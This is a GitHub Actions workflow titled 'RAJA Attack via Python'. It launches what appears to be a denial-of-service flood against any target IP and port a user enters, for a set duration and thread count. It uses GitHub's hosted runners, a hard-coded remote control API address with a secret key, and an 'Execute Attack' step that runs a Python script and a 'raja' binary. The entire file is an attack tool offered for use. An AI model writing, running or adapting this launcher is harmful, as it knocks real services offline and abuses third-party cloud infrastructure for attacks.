name: RAJA Attack via Python

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP'
        required: true
        type: string
      target_port:
        description: 'Target Port'
        required: false
        type: string
        default: '80'
      duration:
        description: 'Attack Duration (seconds)'
        required: false
        type: string
        default: '30'
      threads:
        description: 'Number of Threads'
        required: false
        type: string
        default: '10'

env:
  RAJA_API_URL: 'http://34.208.39.84:80'
  RAJA_API_KEY: ${{ secrets.RAJA_API_KEY }}
  TARGET_IP: ${{ github.event.inputs.target_ip }}
  TARGET_PORT: ${{ github.event.inputs.target_port }}
  ATTACK_DURATION: ${{ github.event.inputs.duration }}
  ATTACK_THREADS: ${{ github.event.inputs.threads }}

jobs:
  python-attack:
    runs-on: ubuntu-latest
    
    steps:
      - name: ðŸ“¥ Checkout repository
        uses: actions/checkout@v4
      
      - name: ðŸ Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      
      - name: ðŸ“¦ Install dependencies
        run: |
          pip install requests
      
      - name: ðŸ“ Create Python script
        run: |
          chmod +x raja
        
      - name: ðŸš€ Execute Attack
        run: |
          python g.py
      
      - name: ðŸ“Š Generate Summary
        if: always()
        run: |
          echo "## RAJA Attack Summary" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**Target:** ${{ github.event.inputs.target_ip }}:${{ github.event.inputs.target_port }}" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**API Server:** ${{ env.RAJA_API_URL }}" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "**Executed Command:**" >> $GITHUB_STEP_SUMMARY
          echo '```bash' >> $GITHUB_STEP_SUMMARY
          echo "./raja ${{ github.event.inputs.target_ip }} ${{ github.event.inputs.target_port }} ${{ github.event.inputs.duration }} ${{ github.event.inputs.threads }}" >> $GITHUB_STEP_SUMMARY
          echo '```' >> $GITHUB_STEP_SUMMARY
